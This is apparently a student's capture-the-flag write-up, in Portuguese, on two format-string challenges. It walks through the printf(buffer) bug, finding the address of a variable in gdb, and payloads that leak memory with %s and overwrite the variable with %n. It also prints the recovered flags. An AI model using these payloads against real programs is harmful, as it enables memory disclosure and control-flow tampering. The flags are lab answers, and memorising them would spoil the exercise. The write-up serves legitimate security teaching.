# CTF Semana #7 Format Strings


### Desafio 1

- **PIE** (Position Independent Executable): **Checksec** indicates "No PIE." PIE allows the executable to be loaded at random memory addresses, increasing the difficulty of predicting memory addresses for attacks. In this case, the absence of PIE means the binary loads at a fixed address, making it **potentially more vulnerable to memory-based attacks.**
- Qual é a linha do código onde a vulnerabilidade se encontra?
    - Linha 27: printf(buffer);
- O que é que a vulnerabilidade permite fazer?
    - Crashar o programa, ler da memória, alterar valores e por fim injetar código malicioso.
- Qual é a funcionalidade que te permite obter a flag?
    - Format String


- Analizar a stack.

```
p.sendline(b"\xaa\xaa\xaa\xaa%x%x")
```

```
\xaa\xaa\xaa\xaaaaaaaaaa78257825
```

- Encontrar endereço da variável key.
```
seed@VM$ gdb program
gdb-peda$ p &flag
$1 = (int *) 0x804b324 <key>
```

Tendo o endereço - sabendo que o output do nosso programa está **no topo da stack**, tudo o que precisamos de fazer é converter esse endereço para o formato little endian. Depois, usamos '%s' para ler o valor do endereço que mencionamos antes.


Obtemos então a flag ao incluir `p.sendline(b"\x24\xB3\x04\x08%s")
`no script de python fornecido:
**flag{fe8afccd6ea98092ea0312928804dada}**.

### Desafio 2

- Qual é a linha do código onde a vulnerabilidade se encontra? E o que é que a vulnerabilidade permite fazer?
    - Linha 14: printf(buffer);
    - Crashar o programa, ler da memória, alterar valores e injetar código malicioso.
- A flag é carregada para memória? Ou existe alguma funcionalidade que podemos utilizar para ter acesso à mesma.
    - Podemos ter acesso e alterar o valor da variável ```key```
- Para desbloqueares essa funcionalidade o que é que tens de fazer?
    - ```Format String``` permite-nos alterar o valor de variáveis, sendo assim, é possível alterar o valor de ```key``` para **0xbeef**

Para resolver o ctf recorremos ao script de python que foi fornecido para o primeiro desafio.

De forma semlhante à tarefa no SEED lab, para resolver o problema recorremos à colocação de **%n** na string a ser utilizada.

Primeiro é necessário saber o endereço da variável **key**, que foi feito com recurso ao programa **gdb**.

```
seed@VM:~$ gdb program
gdb-peda$ p &key
$1 = (int *) 0x804b324 <key>
```


Queremos que key passe a ter o valor **0xbeef**, **48879** em decimal, utilizando a mesma estratégia da aula prática, terão de ser impressos 48879 carateres antes da chamada a **%n**.

O endereço no formato little endian (\x24\xB3\x04\x08) corresponde a 4 carateres.

Inicialmente optámos por construir a string: **\x24\xB3\x04\x08%48875x%n**, só que depois da leitura o stack pointer deixou de apontar para o endereço pretendido.

Desta forma, adicionamos 8 bytes antes do endereço de key, de forma a que quando a instrução %x for lida o pointer passe a apontar para o endereço da variável que pretendemos alterar. **\x24\xB3\x04\x08\x24\xB3\x04\x08%48871x%n**.

```
$ ls
flag.txt
run
$ cat flag.txt
flag{90591962908b3e2f1e7bbc627b024ad9}
```


